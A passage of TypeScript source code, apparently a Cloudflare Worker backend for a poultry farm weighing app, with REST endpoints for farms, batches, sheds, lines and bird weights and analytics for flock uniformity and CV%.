              'INSERT INTO farms (id, name, season, age_week, flock_date) VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP) ON CONFLICT(id) DO UPDATE SET name=excluded.name, updated_at=CURRENT_TIMESTAMP'
            ).bind(farmId, farmName, season, ageWeek).run();

            return jsonResponse({ success: true, farmId });
          }
        }

        // -------------------------------------------------------------
        // B0. PARTS ENDPOINTS (POST /api/parts, PUT /api/parts/:id, DELETE /api/parts/:id)
        // -------------------------------------------------------------
        if ((path === '/parts' || path === '/parts/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const shedId = body.shedId || body.shed_id;
          const name = (body.name || 'Part A').trim();
          if (!shedId) return errorResponse('Missing shedId', 400);

          const partId = `part-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;
          if (env.DB) {
            await env.DB.prepare(
              'INSERT INTO parts (id, shed_id, name) VALUES (?, ?, ?)'
            ).bind(partId, shedId, name).run().catch((err) => {
              console.error('Error adding part:', err);
            });
          }

          return jsonResponse({ id: partId, shedId, name, lines: [] }, 201);
        }

        const singlePartMatch = path.match(/^\/parts\/([^/]+)$/);
        if (singlePartMatch && method === 'PUT') {
          const partId = decodeURIComponent(singlePartMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const name = (body.name || '').trim();
          if (env.DB && name) {
            await env.DB.prepare('UPDATE parts SET name = ? WHERE id = ?').bind(name, partId).run().catch(() => {});
          }
          return jsonResponse({ success: true, message: 'Part updated' });
        }

        if (singlePartMatch && method === 'DELETE') {
          const partId = decodeURIComponent(singlePartMatch[1]);
          if (env.DB) {
            await env.DB.prepare('DELETE FROM bird_weights WHERE line_id IN (SELECT id FROM lines WHERE part_id = ?)').bind(partId).run().catch(() => {});
            await env.DB.prepare('DELETE FROM lines WHERE part_id = ?').bind(partId).run().catch(() => {});
            await env.DB.prepare('DELETE FROM parts WHERE id = ?').bind(partId).run().catch(() => {});
          }
          return jsonResponse({ success: true, message: 'Part deleted' });
        }

        // -------------------------------------------------------------
        // B1. LINES ENDPOINTS (POST /api/lines, PUT /api/lines/:id, DELETE /api/lines/:id)
        // -------------------------------------------------------------
        if ((path === '/lines' || path === '/lines/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const partId = body.partId || body.part_id;
          if (!partId) return errorResponse('Missing partId', 400);

          let lineNum = body.lineNumber;
          if (!lineNum && env.DB) {
            const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM lines WHERE part_id = ?').bind(partId).first() as any;
            lineNum = (countRes?.count || 0) + 1;
          } else if (!lineNum) {
            lineNum = 1;
          }

          const lineName = body.name || `Line ${lineNum}`;
          const gender = (body.gender || 'MALE').toUpperCase() === 'FEMALE' ? 'FEMALE' : 'MALE';
          const lineId = `line-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;

          if (env.DB) {
            await env.DB.prepare(`
              INSERT INTO lines (id, part_id, line_number, name, gender, std_weight_grams, target_bird_count)
              VALUES (?, ?, ?, ?, ?, 140, 50)
            `).bind(lineId, partId, lineNum, lineName, gender).run().catch((err) => {
              console.error('Error adding line:', err);
            });
          }

          return jsonResponse({ id: lineId, partId, lineNumber: lineNum, name: lineName, gender, weights: [] }, 201);
        }

        const singleLineMatch = path.match(/^\/lines\/([^/]+)$/);
        if (singleLineMatch && method === 'PUT') {
          const lineId = decodeURIComponent(singleLineMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          if (env.DB) {
            if (body.name) {
              await env.DB.prepare('UPDATE lines SET name = ? WHERE id = ?').bind(body.name, lineId).run().catch(() => {});
            }
            if (body.gender) {
              const g = body.gender.toUpperCase() === 'FEMALE' ? 'FEMALE' : 'MALE';
              await env.DB.prepare('UPDATE lines SET gender = ? WHERE id = ?').bind(g, lineId).run().catch(() => {});
            }
          }
          return jsonResponse({ success: true, message: 'Line updated' });
        }

        if (singleLineMatch && method === 'DELETE') {
          const lineId = decodeURIComponent(singleLineMatch[1]);
          if (env.DB) {
            const line = await env.DB.prepare('SELECT part_id FROM lines WHERE id = ?').bind(lineId).first() as any;
            await env.DB.prepare('DELETE FROM bird_weights WHERE line_id = ?').bind(lineId).run().catch(() => {});
            await env.DB.prepare('DELETE FROM lines WHERE id = ?').bind(lineId).run().catch(() => {});

            // Auto-reindex remaining lines in that part sequentially from Line 1
            if (line?.part_id) {
              const remRes = await env.DB.prepare('SELECT id FROM lines WHERE part_id = ? ORDER BY line_number ASC, rowid ASC').bind(line.part_id).all().catch(() => ({ results: [] }));
              const remLines = (remRes.results || []) as any[];
              for (let i = 0; i < remLines.length; i++) {
                const nextNum = i + 1;
                await env.DB.prepare('UPDATE lines SET line_number = ?, name = ? WHERE id = ?').bind(nextNum, `Line ${nextNum}`, remLines[i].id).run().catch(() => {});
              }
            }
          }
          return jsonResponse({ success: true, message: 'Line deleted' });
        }

        // -------------------------------------------------------------
        // B. LINE GENDER ENDPOINT: PATCH /api/lines/:id/gender
        // -------------------------------------------------------------
        const lineGenderMatch = path.match(/^\/lines\/([^/]+)\/gender$/);
        if (lineGenderMatch && method === 'PATCH') {
          const lineId = decodeURIComponent(lineGenderMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const gender = (body.gender || '').toUpperCase();

          if (gender !== 'MALE' && gender !== 'FEMALE') {
            return errorResponse('Invalid gender. Must be MALE or FEMALE', 400);
          }

          if (!env.DB) {
            return jsonResponse({ success: true, lineId, gender, note: 'Simulated D1 mode' });
          }

          // Fetch flock age/week to look up new STD
          const lineInfo = await env.DB.prepare(`
            SELECT l.id, l.name, l.part_id, f.flock_age_days, f.age_week
            FROM lines l
            JOIN parts p ON l.part_id = p.id
            JOIN sheds s ON p.shed_id = s.id
            JOIN farms f ON s.farm_id = f.id
            WHERE l.id = ?
          `).bind(lineId).first() as any;

          let stdWeight = gender === 'MALE' ? 150 : 140;
          if (lineInfo) {
            const weekNum = parseInt(String(lineInfo.age_week || 'W1').replace(/\D/g, '') || '1', 10);
            const stdLookup = await env.DB.prepare(
              'SELECT std_weight_grams FROM standard_weights WHERE age_week = ? AND gender = ?'
            ).bind(weekNum, gender).first() as any;
            if (stdLookup && stdLookup.std_weight_grams) {
              stdWeight = stdLookup.std_weight_grams;
            }
          }

          await env.DB.prepare(
            'UPDATE lines SET gender = ?, std_weight_grams = ? WHERE id = ?'
          ).bind(gender, stdWeight, lineId).run();

          return jsonResponse({
            success: true,
            lineId,
            gender,
            stdWeightGrams: stdWeight,
            message: `Line gender updated to ${gender} with STD ${stdWeight}g`,
          });
        }

        // -------------------------------------------------------------
        // C. WEIGHTS ENDPOINTS: POST /api/weights, DELETE /api/weights
        // -------------------------------------------------------------
        if (path === '/weights' || path === '/weights/') {
          if (method === 'POST') {
            const body = await request.json().catch(() => ({})) as any;
            const { lineId, weight, entryIndex, recordedBy, week } = body;

            if (!lineId || weight === undefined || weight === null) {
              return errorResponse('Missing required fields: lineId and weight', 400);
            }

            const weightGrams = Number(weight);
            if (isNaN(weightGrams) || weightGrams <= 0) {
              return errorResponse('Weight must be a positive number', 400);
            }

            if (!env.DB) {
              return jsonResponse({ success: true, id: `w-${Date.now()}`, weightGrams });
            }

            // Get current line STD
            const line = await env.DB.prepare('SELECT std_weight_grams, gender FROM lines WHERE id = ?').bind(lineId).first() as any;
            const stdWeightAtEntry = line?.std_weight_grams || 140;

            const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM bird_weights WHERE line_id = ?').bind(lineId).first() as any;
            const finalIndex = entryIndex !== undefined ? entryIndex : (countRes?.count || 0) + 1;
            const weightId = `w-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;

            await env.DB.prepare(
              'INSERT INTO bird_weights (id, line_id, entry_index, weight_grams, std_weight_at_entry, recorded_by, week) VALUES (?, ?, ?, ?, ?, ?, ?)'
            ).bind(weightId, lineId, finalIndex, weightGrams, stdWeightAtEntry, recordedBy || 'Operator', week || 'W1').run();

            return jsonResponse({
              success: true,
              id: weightId,
              lineId,
              entryIndex: finalIndex,
              weightGrams,
              stdWeightAtEntry,
            });
          }

          if (method === 'DELETE') {
            const body = await request.json().catch(() => ({})) as any;
            const { id, lineId, index, clearAll } = body;

            if (!env.DB) return jsonResponse({ success: true });

            if (clearAll && lineId) {
              await env.DB.prepare('DELETE FROM bird_weights WHERE line_id = ?').bind(lineId).run();
              return jsonResponse({ success: true, message: `Cleared all weights in line ${lineId}` });
            }

            if (id) {
              await env.DB.prepare('DELETE FROM bird_weights WHERE id = ?').bind(id).run();
              return jsonResponse({ success: true, message: `Deleted weight ${id}` });
            }

            if (lineId && index !== undefined) {
              // Delete by line and order index
              const target = await env.DB.prepare(
                'SELECT id FROM bird_weights WHERE line_id = ? ORDER BY entry_index ASC LIMIT 1 OFFSET ?'
              ).bind(lineId, index).first() as any;

              if (target?.id) {
                await env.DB.prepare('DELETE FROM bird_weights WHERE id = ?').bind(target.id).run();
              }
              return jsonResponse({ success: true, message: `Deleted weight at index ${index}` });
            }

            return errorResponse('Specify weight id, clearAll, or lineId and index', 400);
          }
        }

        // Sub-routes for weights on lines:
        // POST /api/lines/:id/weight
        // DELETE /api/lines/:id/weight/:index
        // POST /api/lines/:id/clear
        const lineWeightMatch = path.match(/^\/lines\/([^/]+)\/weight$/);
        if (lineWeightMatch && method === 'POST') {
          const lineId = decodeURIComponent(lineWeightMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const weightGrams = Number(body.weight);

          if (!env.DB) return jsonResponse({ success: true, weight: weightGrams });

          const line = await env.DB.prepare('SELECT std_weight_grams FROM lines WHERE id = ?').bind(lineId).first() as any;
          const stdWeightAtEntry = line?.std_weight_grams || 140;
          const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM bird_weights WHERE line_id = ?').bind(lineId).first() as any;
          const nextIndex = (countRes?.count || 0) + 1;
          const weightId = `w-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;

          await env.DB.prepare(
            'INSERT INTO bird_weights (id, line_id, entry_index, weight_grams, std_weight_at_entry, recorded_by, week) VALUES (?, ?, ?, ?, ?, ?, ?)'
          ).bind(weightId, lineId, nextIndex, weightGrams, stdWeightAtEntry, body.userName || 'Operator', body.week || 'W1').run();

          return jsonResponse({ success: true, id: weightId, weight: weightGrams });
        }

        const lineDeleteWeightMatch = path.match(/^\/lines\/([^/]+)\/weight\/(\d+)$/);
        if (lineDeleteWeightMatch && method === 'DELETE') {
          const lineId = decodeURIComponent(lineDeleteWeightMatch[1]);
          const index = parseInt(lineDeleteWeightMatch[2], 10);

          if (!env.DB) return jsonResponse({ success: true });

          const target = await env.DB.prepare(
            'SELECT id FROM bird_weights WHERE line_id = ? ORDER BY entry_index ASC LIMIT 1 OFFSET ?'
          ).bind(lineId, index).first() as any;

          if (target?.id) {
            await env.DB.prepare('DELETE FROM bird_weights WHERE id = ?').bind(target.id).run();
          }

          return jsonResponse({ success: true });
        }

        const lineClearMatch = path.match(/^\/lines\/([^/]+)\/clear$/);
        if (lineClearMatch && method === 'POST') {
          const lineId = decodeURIComponent(lineClearMatch[1]);
          if (env.DB) {
            await env.DB.prepare('DELETE FROM bird_weights WHERE line_id = ?').bind(lineId).run();
          }
          return jsonResponse({ success: true, message: `Weights cleared for line ${lineId}` });
        }

        // -------------------------------------------------------------
        // D. ADMIN ANALYTICS ENDPOINT: GET /api/admin/analytics
        // Computes AVG WT, STD, Uniformity %, CV % dynamically per Line Gender
        // -------------------------------------------------------------
        if ((path === '/admin/analytics' || path === '/admin/analytics/') && method === 'GET') {
          const farmId = url.searchParams.get('farmId');
          if (!env.DB) {
            return jsonResponse({
              analytics: {
                totalBirds: 0,
                femaleAvg: 0,
                maleAvg: 0,
                femaleUniformity: 0,
                maleUniformity: 0,
                linesBreakdown: [],
              },
            });
          }

          const linesQuery = farmId
            ? await env.DB.prepare(`
                SELECT l.id, l.name as line_name, l.gender, l.std_weight_grams,
                       s.id as shed_id, s.name as shed_name,
                       p.id as part_id, p.name as part_name
                FROM lines l
                JOIN parts p ON l.part_id = p.id
                JOIN sheds s ON p.shed_id = s.id
                WHERE s.farm_id = ?
                ORDER BY s.name, p.name, l.line_number
              `).bind(farmId).all()
            : await env.DB.prepare(`
                SELECT l.id, l.name as line_name, l.gender, l.std_weight_grams,
                       s.id as shed_id, s.name as shed_name,
                       p.id as part_id, p.name as part_name
                FROM lines l
                JOIN parts p ON l.part_id = p.id
                JOIN sheds s ON p.shed_id = s.id
                ORDER BY s.name, p.name, l.line_number
              `).all();

          const allLines = linesQuery.results || [];
          const linesBreakdown: any[] = [];

          let allFemaleWeights: number[] = [];
          let allMaleWeights: number[] = [];

          for (const l of allLines) {
            const weightsRes = await env.DB.prepare(
              'SELECT weight_grams FROM bird_weights WHERE line_id = ?'
            ).bind(l.id).all();
            const weights = (weightsRes.results || []).map((w: any) => Number(w.weight_grams));

            const count = weights.length;
            const sum = weights.reduce((a: number, b: number) => a + b, 0);
            const avg = count > 0 ? Math.round((sum / count) * 10) / 10 : 0;
            const std = l.std_weight_grams || (l.gender === 'MALE' ? 150 : 140);

            // Uniformity: percentage within std ± 10%
            const lowerBand = std * 0.9;
            const upperBand = std * 1.1;
            const inRangeCount = count > 0 ? weights.filter((w: number) => w >= lowerBand && w <= upperBand).length : 0;
            const uniformityPct = count > 0 ? Math.round((inRangeCount / count) * 1000) / 10 : 0;

            // CV% (Coefficient of variation: Standard Deviation / Mean * 100)
            let cv = 0;
            if (count > 1 && avg > 0) {
              const variance = weights.reduce((acc: number, val: number) => acc + Math.pow(val - avg, 2), 0) / (count - 1);
              const stdDev = Math.sqrt(variance);
              cv = Math.round((stdDev / avg) * 10000) / 100;
            }

            if (l.gender === 'FEMALE') {
              allFemaleWeights.push(...weights);
            } else {
              allMaleWeights.push(...weights);
            }

            linesBreakdown.push({
              lineId: l.id,
              lineName: l.line_name,
              shedName: l.shed_name,
              partName: l.part_name,
              gender: l.gender,
              stdWeight: std,
              birdCount: count,
              averageWeight: avg,
              uniformityPercent: uniformityPct,
              cvPercent: cv,
            });
          }

          const calcGroupStats = (weightsList: number[]) => {
            const count = weightsList.length;
            if (count === 0) return { count: 0, avg: 0, uniformity: 0 };
            const avg = Math.round((weightsList.reduce((a, b) => a + b, 0) / count) * 10) / 10;
            const inRange = weightsList.filter(w => w >= avg * 0.9 && w <= avg * 1.1).length;
            return {
              count,
              avg,
              uniformity: Math.round((inRange / count) * 1000) / 10,
            };
          };

          return jsonResponse({
            success: true,
            analytics: {
              totalBirds: allFemaleWeights.length + allMaleWeights.length,
              female: calcGroupStats(allFemaleWeights),
              male: calcGroupStats(allMaleWeights),
              linesBreakdown,
            },
          });
        }

        // -------------------------------------------------------------
        // E. FARMS REST ENDPOINTS: GET /api/farms, POST /api/farms
        // -------------------------------------------------------------
        if (path === '/farms' || path === '/farms/') {
          if (method === 'GET') {
            if (!env.DB) {
              return jsonResponse([]);
            }
            await ensureBatchesTable(env);
            const includeArchived = url.searchParams.get('includeArchived') === 'true';
            const farmsRes = includeArchived
              ? await env.DB.prepare('SELECT * FROM farms ORDER BY created_at DESC').all()
              : await env.DB.prepare('SELECT * FROM farms WHERE is_archived = 0 ORDER BY created_at DESC').all();

            const farms = farmsRes.results || [];
            const summaries: any[] = [];

            const allUsersRes = await env.DB.prepare('SELECT id, name, role, assigned_farms, assigned_farm_id FROM users').all().catch(() => ({ results: [] }));
            const allUsers = (allUsersRes.results || []) as any[];

            for (const f of farms) {
              const activeBatch = await ensureFarmActiveBatch(env, f);
              const shedCountRes = await env.DB.prepare('SELECT COUNT(*) as count FROM sheds WHERE farm_id = ?').bind(f.id).first() as any;
              const subCountRes = await env.DB.prepare('SELECT COUNT(*) as count FROM submissions WHERE farm_id = ?').bind(f.id).first() as any;

              const assignedUsers = allUsers.filter(u => {
                if (u.assigned_farm_id === f.id) return true;
                try {
                  const list = JSON.parse(u.assigned_farms || '[]');
                  return Array.isArray(list) && (list.includes(f.id) || list.includes(f.name));
                } catch {
                  return false;
                }
              });
              const assignedUserNames = assignedUsers.map(u => {
                const r = (u.role || '').toUpperCase();
                const display = (r === 'ADMIN' || r === 'MANAGER') ? 'Manager' : (r === 'INCHARGE' ? 'In-Charge' : 'Supervisor');
                return `${u.name} (${display})`;
              });

              summaries.push({
                id: f.id,
                name: f.name,
                location: f.location,
                flockDate: activeBatch?.startDate || f.flock_date || f.created_at,
                ageWeek: f.age_week || 'W1',
                season: f.season || 'Summer',
                updatedAt: f.updated_at || f.created_at,
                isArchived: Boolean(f.is_archived),
                activeBatch,
                startDate: activeBatch?.startDate || f.flock_date,
                startWeekNumber: activeBatch?.startWeekNumber || 1,
                assignedUserNames,
                _count: {
                  sheds: shedCountRes?.count || 0,
                  submissions: subCountRes?.count || 0,
                },
              });
            }

            return jsonResponse(summaries);
          }

          if (method === 'POST') {
            const body = await request.json().catch(() => ({})) as any;
            const farmId = `farm-${Date.now()}`;
            const farmName = (body.name || 'New Farm').trim();
            const season = body.season || 'Summer';
            const ageWeek = body.ageWeek || 'W1';
            const flockDate = body.flockDate || new Date().toISOString().split('T')[0];
            const shedCount = Math.min(Math.max(Number(body.shedCount) || 10, 1), 40);

            const createdSheds: any[] = [];
            const startWeekNum = parseInt(String(ageWeek || 'W1').replace(/\D/g, '') || '1', 10);
            const batchId = `batch-${farmId}-1`;

            if (env.DB) {
              await ensureBatchesTable(env);
              await env.DB.prepare(
                'INSERT INTO farms (id, name, season, age_week, flock_date) VALUES (?, ?, ?, ?, ?)'
              ).bind(farmId, farmName, season, ageWeek, flockDate).run();

              // Automatically initialize default Batch 1 for the new farm
              await env.DB.prepare(`
                INSERT INTO batches (id, farm_id, batch_name, start_date, start_week_number, status)
                VALUES (?, ?, 'Batch 1', ?, ?, 'ACTIVE')
              `).bind(batchId, farmId, flockDate, startWeekNum).run().catch(() => {});
            }

            // Pre-create sheds, parts, and lines with Line-level Gender and empty weights
            for (let sIdx = 1; sIdx <= shedCount; sIdx++) {
              const shedId = `shed-${farmId}-${sIdx}`;
              const shedName = `Shed ${sIdx}`;
              if (env.DB) {
                await env.DB.prepare(
                  'INSERT INTO sheds (id, farm_id, name) VALUES (?, ?, ?)'
                ).bind(shedId, farmId, shedName).run().catch(() => {});
              }

              const partsList: any[] = [];
              // 2 Parts per shed
              for (let pIdx = 1; pIdx <= 2; pIdx++) {
                const partId = `part-${shedId}-${pIdx}`;
                const partName = pIdx === 1 ? 'Part 1' : 'Part 2';
                if (env.DB) {
                  await env.DB.prepare(
                    'INSERT INTO parts (id, shed_id, name) VALUES (?, ?, ?)'
                  ).bind(partId, shedId, partName).run().catch(() => {});
                }

                const linesList: any[] = [];
                // 5 Lines per part
                for (let lIdx = 1; lIdx <= 5; lIdx++) {
                  const lineId = `line-${partId}-${lIdx}`;
                  // Default to FEMALE for main grower lines, MALE for line 5
                  const gender = (sIdx === shedCount || lIdx === 5) ? 'MALE' : 'FEMALE';
                  const std = gender === 'MALE' ? 150 : 140;

                  if (env.DB) {
                    await env.DB.prepare(
                      'INSERT INTO lines (id, part_id, line_number, name, gender, std_weight_grams) VALUES (?, ?, ?, ?, ?, ?)'
                    ).bind(lineId, partId, lIdx, `Line ${lIdx}`, gender, std).run().catch(() => {});
                  }

                  linesList.push({
                    id: lineId,
                    name: `Line ${lIdx}`,
                    lineNumber: lIdx,
                    gender,
                    stdWeight: std,
                    targetBirdCount: 0,
                    weights: [],
                  });
                }

                partsList.push({
                  id: partId,
                  name: partName,
                  lines: linesList,
                });
              }

              createdSheds.push({
                id: shedId,
                farmId,
                name: shedName,
                type: sIdx === shedCount ? 'Male' : 'Female',
                targetBirdCount: 0,
                locked: false,
                lockedByUserId: null,
                lockedByUserName: null,
                lockedAt: null,
                lastHeartbeatAt: null,
                recordedByUserId: null,
                recordedByUserName: null,
                birdCount: 0,
                weights: [],
                status: 'PENDING',
                savedStatus: 'PENDING',
                totalBirdCount: 0,
                parts: partsList,
              });
            }

            return jsonResponse({
              id: farmId,
              name: farmName,
              season,
              ageWeek,
              flockDate,
              shedCount,
              sheds: createdSheds,
              activeBatch: {
                id: batchId,
                farmId,
                batchName: 'Batch 1',
                startDate: flockDate,
                startWeekNumber: startWeekNum,
                status: 'ACTIVE',
              },
            }, 201);
          }
        }

        // -------------------------------------------------------------
        // E2. BATCHES REST ENDPOINTS: GET & POST /api/farms/:id/batches
        // -------------------------------------------------------------
        const farmBatchesMatch = path.match(/^\/farms\/([^/]+)\/batches$/);
        if (farmBatchesMatch) {
          const farmId = decodeURIComponent(farmBatchesMatch[1]);
          if (method === 'GET') {
            if (!env.DB) return jsonResponse({ success: true, batches: [] });
            await ensureBatchesTable(env);
            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            if (!farm) return errorResponse('Farm not found', 404);

            await ensureFarmActiveBatch(env, farm);
            const batchesRes = await env.DB.prepare(
              'SELECT * FROM batches WHERE farm_id = ? ORDER BY created_at DESC'
            ).bind(farmId).all();

            const batches = (batchesRes.results || []).map((b: any) => ({
              id: b.id,
              farmId: b.farm_id,
              batchName: b.batch_name,
              startDate: b.start_date,
              startWeekNumber: b.start_week_number,
              status: b.status,
              createdAt: b.created_at,
              updatedAt: b.updated_at,
            }));

            return jsonResponse({ success: true, batches });
          }

          if (method === 'POST') {
            if (!env.DB) return jsonResponse({ success: true, message: 'D1 not bound' });
            await ensureBatchesTable(env);
            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            if (!farm) return errorResponse('Farm not found', 404);

            const body = await request.json().catch(() => ({})) as any;

            // 1. Mark existing batches as COMPLETED (read-only)
            await env.DB.prepare(
              'UPDATE batches SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE farm_id = ?'
            ).bind('COMPLETED', farmId).run();

            // 2. Determine new batch name
            const countRes = await env.DB.prepare(
              'SELECT COUNT(*) as count FROM batches WHERE farm_id = ?'
            ).bind(farmId).first() as any;
            const count = (countRes?.count || 0) + 1;
            const batchName = (body.batchName || `Batch ${count}`).trim();
            const startDate = body.startDate || new Date().toISOString().split('T')[0];
            const startWeekNumber = Number(body.startWeekNumber) || 1;
            const batchId = `batch-${farmId}-${Date.now()}`;

            // 3. Create new ACTIVE batch
            await env.DB.prepare(`
              INSERT INTO batches (id, farm_id, batch_name, start_date, start_week_number, status)
              VALUES (?, ?, ?, ?, ?, 'ACTIVE')
            `).bind(batchId, farmId, batchName, startDate, startWeekNumber).run();

            // 4. Release any active locks so new batch starts fresh
            await env.DB.prepare(`
              UPDATE sheds SET
                locked_by_user_id = NULL,
                locked_by_user_name = NULL,
                locked_at = NULL,
                last_heartbeat_at = NULL
              WHERE farm_id = ?
            `).bind(farmId).run().catch(() => {});

            const newBatch = {
              id: batchId,
              farmId,
              batchName,
              startDate,
              startWeekNumber,
              status: 'ACTIVE',
            };

            return jsonResponse({
              success: true,
              batch: newBatch,
              message: `Started ${batchName} successfully for farm ${farm.name}.`,
            }, 201);
          }
        }

        // GET /api/farms/:id
        const singleFarmMatch = path.match(/^\/farms\/([^/]+)$/);
        if (singleFarmMatch) {
          const farmId = decodeURIComponent(singleFarmMatch[1]);
          if (method === 'GET') {
            if (!env.DB) {
              return jsonResponse({ id: farmId, name: 'Active Farm', sheds: [] });
            }

            await ensureShedWeekStatusTable(env);
            await ensureBatchesTable(env);

            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            if (!farm) return errorResponse('Farm not found', 404);

            const activeBatch = await ensureFarmActiveBatch(env, farm);
            const requestedBatchId = url.searchParams.get('batchId');
            const targetBatchId = requestedBatchId || activeBatch?.id;

            // Fetch all batches for this farm
            const allBatchesRes = await env.DB.prepare(
              'SELECT * FROM batches WHERE farm_id = ? ORDER BY created_at DESC'
            ).bind(farmId).all().catch(() => ({ results: [] }));
            const batchesList = (allBatchesRes.results || []).map((b: any) => ({
              id: b.id,
              farmId: b.farm_id,
              batchName: b.batch_name,
              startDate: b.start_date,
              startWeekNumber: b.start_week_number,
              status: b.status,
            }));

            // Check if selected batch is the initial/first batch for legacy backward compatibility
            const firstBatch = batchesList.length > 0 ? batchesList[batchesList.length - 1] : null;
            const isInitialBatch = Boolean(firstBatch && firstBatch.id === targetBatchId);

            const targetWeek = (url.searchParams.get('week') || farm.age_week || 'W18').toUpperCase();

            // Check if submission exists for this specific week and batch
            const subForWeek = isInitialBatch
              ? await env.DB.prepare(
                  'SELECT * FROM submissions WHERE farm_id = ? AND UPPER(flock_age) = ? AND (batch_id = ? OR batch_id IS NULL) ORDER BY created_at DESC LIMIT 1'
                ).bind(farmId, targetWeek, targetBatchId).first() as any
              : await env.DB.prepare(
                  'SELECT * FROM submissions WHERE farm_id = ? AND UPPER(flock_age) = ? AND batch_id = ? ORDER BY created_at DESC LIMIT 1'
                ).bind(farmId, targetWeek, targetBatchId).first() as any;

            // Fetch shed saves for this week and batch from shed_week_status
            const shedWeekStatuses = isInitialBatch
              ? await env.DB.prepare(
                  'SELECT * FROM shed_week_status WHERE farm_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL)'
                ).bind(farmId, targetWeek, targetBatchId).all().catch(() => ({ results: [] }))
              : await env.DB.prepare(
                  'SELECT * FROM shed_week_status WHERE farm_id = ? AND UPPER(week) = ? AND batch_id = ?'
                ).bind(farmId, targetWeek, targetBatchId).all().catch(() => ({ results: [] }));
            const swsMap = new Map((shedWeekStatuses.results || []).map((s: any) => [s.shed_id, s]));

            const shedsRes = await env.DB.prepare('SELECT * FROM sheds WHERE farm_id = ?').bind(farmId).all();
            const sheds: any[] = [];
            let totalFarmBirds = 0;
            let savedShedsCount = 0;

            for (const s of shedsRes.results || []) {
              const partsRes = await env.DB.prepare('SELECT * FROM parts WHERE shed_id = ?').bind(s.id).all();
              const parts: any[] = [];
              let shedBirdCount = 0;

              for (const p of partsRes.results || []) {
                const linesRes = await env.DB.prepare('SELECT * FROM lines WHERE part_id = ? ORDER BY line_number ASC').bind(p.id).all();
                const lines: any[] = [];

                for (const l of linesRes.results || []) {
                  // Strictly filter weights by line_id, targetWeek AND batch
                  const weightsRes = isInitialBatch
                    ? await env.DB.prepare(
                        'SELECT weight_grams FROM bird_weights WHERE line_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL) ORDER BY entry_index ASC'
                      ).bind(l.id, targetWeek, targetBatchId).all()
                    : await env.DB.prepare(
                        'SELECT weight_grams FROM bird_weights WHERE line_id = ? AND UPPER(week) = ? AND batch_id = ? ORDER BY entry_index ASC'
                      ).bind(l.id, targetWeek, targetBatchId).all();

                  const weights = (weightsRes.results || []).map((w: any) => w.weight_grams);
                  shedBirdCount += weights.length;

                  lines.push({
                    id: l.id,
                    name: l.name,
                    gender: l.gender,
                    weights,
                  });
                }

                parts.push({
                  id: p.id,
                  name: p.name,
                  lines,
                });
              }

              totalFarmBirds += shedBirdCount;
              const sws: any = swsMap.get(s.id);
              const isSaved = sws?.status === 'SAVED';
              if (isSaved) savedShedsCount++;

              const last = s.last_heartbeat_at ? new Date(s.last_heartbeat_at).getTime() : 0;
              const isLocked = Boolean(s.locked_by_user_id && last && (Date.now() - last <= 120_000) && (!s.locked_week || s.locked_week.toUpperCase() === targetWeek.toUpperCase()));

              sheds.push({
                id: s.id,
                name: s.name,
                locked: isLocked,
                lockedByUserId: isLocked ? s.locked_by_user_id : null,
                lockedByUserName: isLocked ? s.locked_by_user_name : null,
                lockedAt: isLocked ? s.locked_at : null,
                lastHeartbeatAt: isLocked ? s.last_heartbeat_at : null,
                // Stage 2: Team Visibility attributes strictly scoped to targetWeek
                savedStatus: isSaved ? 'SAVED' : (shedBirdCount > 0 ? 'DRAFT' : 'PENDING'),
                savedByUserId: isSaved ? (sws?.saved_by_user_id || null) : null,
                savedByUserName: isSaved ? (sws?.saved_by_user_name || null) : null,
                totalBirdCount: isSaved ? (sws?.total_bird_count || 0) : shedBirdCount,
                savedAt: isSaved ? (sws?.saved_at || null) : null,
                parts,
              });
            }

            const totalShedsCount = sheds.length;
            const allShedsSaved = totalShedsCount > 0 && savedShedsCount >= totalShedsCount;
            const selectedBatch = batchesList.find(b => b.id === targetBatchId) || activeBatch;

            // Fetch assigned user names for this farm
            const farmUsersRes = await env.DB.prepare('SELECT id, name, role, assigned_farms, assigned_farm_id FROM users').all().catch(() => ({ results: [] }));
            const farmAssignedUsers = ((farmUsersRes.results || []) as any[]).filter(u => {
              if (u.assigned_farm_id === farmId) return true;
              try {
                const list = JSON.parse(u.assigned_farms || '[]');
                return Array.isArray(list) && (list.includes(farmId) || list.includes(farm.name));
              } catch {
                return false;
              }
            });
            const assignedUserNames = farmAssignedUsers.map(u => {
              const r = (u.role || '').toUpperCase();
              const display = (r === 'ADMIN' || r === 'MANAGER') ? 'Manager' : (r === 'INCHARGE' ? 'In-Charge' : 'Supervisor');
              return `${u.name} (${display})`;
            });

            return jsonResponse({
              ...farm,
              ageWeek: targetWeek,
              activeBatch,
              batches: batchesList,
              currentBatch: selectedBatch,
              startDate: selectedBatch?.startDate || farm.flock_date,
              startWeekNumber: selectedBatch?.startWeekNumber || 1,
              status: subForWeek ? 'COMPLETED' : 'DRAFT',
              assignedUserNames,
              audit: subForWeek ? {
                status: 'COMPLETED',
                lastSubmittedAt: subForWeek.created_at,
                lastSubmittedBy: subForWeek.submitted_by,
                lastSubmittedRole: subForWeek.submitted_role,
                submittedBy: subForWeek.submitted_by,
                submittedRole: subForWeek.submitted_role,
                totalBirdsSubmitted: subForWeek.total_birds,
                batchId: subForWeek.batch_id,
                batchName: subForWeek.batch_name,
              } : null,
              farmProgress: {
                totalShedsCount,
                savedShedsCount,
                totalFarmBirds,
                allShedsSaved,
